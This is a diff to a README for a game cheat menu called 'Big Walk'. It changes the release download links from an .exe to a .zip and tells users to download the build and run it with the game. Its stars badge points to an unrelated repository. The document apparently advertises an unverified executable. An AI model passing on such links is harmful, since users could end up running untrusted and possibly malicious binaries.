@@ -1,7 +1,7 @@
-# Big Walk Cheat Menu - v1.2 (September 23)
+# Big Walk Cheat Menu - v1.2 (September 26)
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/tunnelshinobivice/Big-Walk-v1/releases/download/v1/Big.Walk-Build-1.2.exe)
-[![GitHub release](https://img.shields.io/badge/Release-v1.2-blue?style=for-the-badge)](https://github.com/tunnelshinobivice/Big-Walk-v1/releases/download/v1/Big.Walk-Build-1.2.exe)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/tunnelshinobivice/Big-Walk-v1/releases/download/v1/Big.Walk-Build-1.2.zip)
+[![GitHub release](https://img.shields.io/badge/Release-v1.2-blue?style=for-the-badge)](https://github.com/tunnelshinobivice/Big-Walk-v1/releases/download/v1/Big.Walk-Build-1.2.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](https://opensource.org/licenses/MIT)
 [![Stars](https://img.shields.io/github/stars/Azure-Peak/Azure-Peak?style=for-the-badge)](https://github.com/tunnelshinobivice/Big-Walk-v1/stargazers)
 
@@ -29,7 +29,7 @@
 ---
 
 ## How to use
-1.  Download the [latest build from my Releases page](https://github.com/tunnelshinobivice/Big-Walk-v1/releases/download/v1/Big.Walk-Build-1.2.exe).
+1.  Download the [latest build from my Releases page](https://github.com/tunnelshinobivice/Big-Walk-v1/releases/download/v1/Big.Walk-Build-1.2.zip).
 2.  Place it anywhere, it doesn't require an install.
 3.  Launch the game.
 4.  Run the heck.
